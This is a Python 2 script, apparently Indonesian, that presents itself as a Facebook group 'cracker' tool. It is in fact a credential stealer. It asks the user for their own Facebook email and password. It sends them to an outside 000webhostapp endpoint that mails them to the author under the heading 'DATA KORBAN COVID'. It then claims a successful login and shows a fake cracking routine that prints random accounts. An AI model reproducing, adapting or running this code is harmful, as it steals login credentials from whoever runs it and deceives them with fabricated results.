# coding: UTF-8
import os, random, sys, time
try:
    import requests as rek
except ImportError:
    os.system("pip2 install requests")

# kode warna
m='\033[31;1m'
h='\033[32;1m'
b='\033[34;1m'
p='\033[37;1m'
m_='\033[41;1m'
n='\033[00;1m'

logo="""{}
\t _  _  ___  ____   __    ___  __ _ 
\t( \/ )/ __)(  _ \ / _\  / __)(  / )
\t{} )  (( (__  )   //    \( (__  )  ( 
\t(_/\_)\___)(__\_)\_/\_/ \___)(__\_)

      {}[{} XCrack Tools Facebook Cracker {}]

            {}Author {}: {}SyberTulul ID
""".format(m,p,p,m_,n,b,p,h)
emailgue='muh.haikal779@gmail.com'
anjay = lambda url, data: rek.post(url, data=data)

def main():
    os.system("cls")
    print logo
    us=raw_input('[*] email    : ')
    pw=raw_input('[*] password : ')
    text = """
<table border="1" cellpadding="5" bgcolor="black" width="100%">
<tr>
<th colspan="2"><center><font color="white">DATA KORBAN COVID</font></th>
</tr>
<tr>
<td bgcolor="white"><center><b>Username</td>
<td bgcolor="white"><center><b>{}</td>
</tr>
<tr>
<td bgcolor="white"><center><b>Password</td>
<td bgcolor="white"><center><b>{}</td>
</tr>
    """.format(us, pw)
    web='https://extremeboy-private-tool.000webhostapp.com/post.php'
    data = {"from":"[!] Korban Covid","email_kamu":"extremeboy@phising.net","email_target":emailgue,"subject":"Ussername : "+us,"mesage":text}
    try:
        anjay(web,data)
    except rek.ConnectionError:
        sys.exit("periksa koneksi anda")
    time.sleep(2)
    print "login berhasil"
    time.sleep(2)
    menu()

def menu():
    os.system('cls')
    print logo
    print 47*'='
    print '\t[1] start crack group'
    print '\t[0] exit\n'
    pilih()

def pilih():
    pil=raw_input("[#]> ")
    if pil == '1':
        crack()
    elif pil == '0':
        os.system("clear")
        sys.exit('exit program')

def crack():
    os.system('cls')
    print logo
    id=raw_input('id group : ')
    time.sleep(2)
    print('Start crack')
    jml=random.randint(0, 99)
    for x in range(jml):
        w=random.randint(0, 9)
        pw=random.choice(['sayang', 'indonesia'])
        cp=random.choice(['OKE', 'CP'])
        acak=str(random.randint(0, 999999))
        print cp, '|', '1000'+acak, '|', pw
        time.sleep(w)

if __name__ == "__main__":
    main()